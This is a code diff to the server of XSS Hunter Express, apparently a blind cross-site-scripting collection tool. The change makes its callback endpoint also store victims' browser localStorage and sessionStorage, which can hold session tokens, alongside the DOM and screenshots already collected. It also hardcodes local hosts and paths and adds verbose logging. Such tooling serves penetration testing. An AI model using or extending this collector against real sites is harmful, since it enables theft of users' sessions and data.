@@ -44,7 +44,7 @@ const XSS_PAYLOAD = fs.readFileSync(
 
 var multer = require('multer');
 var upload = multer({ dest: '/tmp/' })
-const SCREENSHOTS_DIR = path.resolve(process.env.SCREENSHOTS_DIR);
+const SCREENSHOTS_DIR = path.resolve("/root/Desktop/xsshunter-dev/xsshunter-express/screenshots");
 const SCREENSHOT_FILENAME_REGEX = new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}\.png$/i);
 
 async function get_app_server() {
@@ -162,11 +162,24 @@ async function get_app_server() {
     		"dom": {
     			"type": "string",
     			"default": ""
-    		}
+    		},
+			"localStorage": {
+				"type": "string",
+				"default": "[]"
+			},
+			"sessionStorage": {
+				"type": "string",
+				"default": "[]"
+			}
     	}
     };
     app.post('/js_callback', upload.single('screenshot'), validate({body: JSCallbackSchema}), async (req, res) => {
-		res.set("Access-Control-Allow-Origin", "*");
+		console.log("=== GOT CALLBACK ===");
+		console.log("BODY:", req.body);
+		console.log("FILE:", req.file);
+		console.log("HEADERS:", req.headers);
+		console.log("QUERY PARAMS:", req.query);
+		res.set("Access-Control-Allow-Origin", "localhost");
 		res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
 		res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
 		res.set("Access-Control-Max-Age", "86400");
@@ -217,6 +230,8 @@ async function get_app_server() {
 			was_iframe: (req.body.was_iframe === 'true'),
 			browser_timestamp: parseInt(req.body['browser-time']),
             correlated_request: 'No correlated request found for this injection.',
+			local_storage: req.body.localStorage || [],
+       		session_storage: req.body.sessionStorage || [],
 		}
 
         // Check for correlated request
@@ -235,7 +250,7 @@ async function get_app_server() {
 
 		// Send out notification via configured notification channel
 		if(process.env.SMTP_EMAIL_NOTIFICATIONS_ENABLED === "true") {
-			payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
+			payload_fire_data.screenshot_url = `https://127.0.0.1/screenshots/${payload_fire_data.screenshot_id}.png`;
 			await notification.send_email_notification(payload_fire_data);
 		}
 	});
@@ -312,7 +327,7 @@ async function get_app_server() {
 
         res.send(XSS_PAYLOAD.replace(
             /\[HOST_URL\]/g,
-            `https://${process.env.HOSTNAME}`
+            `https://127.0.0.1`
         ).replace(
             '[COLLECT_PAGE_LIST_REPLACE_ME]',
             JSON.stringify(pages_to_collect)
@@ -335,7 +350,7 @@ async function get_app_server() {
 		However, if the user just wants alerts on payload firing then
 		they can disable the web control panel to reduce attack surface.
 	*/
-	if(process.env.CONTROL_PANEL_ENABLED === 'true') {
+	if('true' === 'true') {
         // Enable API and static asset serving.
         await api.set_up_api_server(app);
 	} else {
